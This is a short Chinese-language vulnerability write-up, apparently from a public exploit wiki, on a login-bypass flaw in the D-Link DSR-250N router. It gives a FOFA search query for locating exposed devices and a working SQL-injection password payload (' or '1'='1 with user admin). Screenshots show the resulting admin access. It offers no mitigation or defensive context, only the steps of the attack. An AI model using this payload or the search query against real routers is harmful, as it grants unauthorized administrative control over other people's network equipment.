# D-Link DSR-250N 万能密码漏洞

## 漏洞描述

D-Link DSR-250N 存在万能密码漏洞，攻击者通过漏洞可以获取后台权限

## 漏洞影响

> [!NOTE]
>
> D-Link DSR-250N

## FOFA

> [!NOTE]
>
> app="D_Link-DSR-250N"

## 漏洞复现

登录页面如下

![image-20210609175053339](http://wikioss.peiqi.tech/vuln/image-20210609175053339.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

```
user: admin
pass: ' or '1'='1
```

成功登录后台

![image-20210609175150907](http://wikioss.peiqi.tech/vuln/image-20210609175150907.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)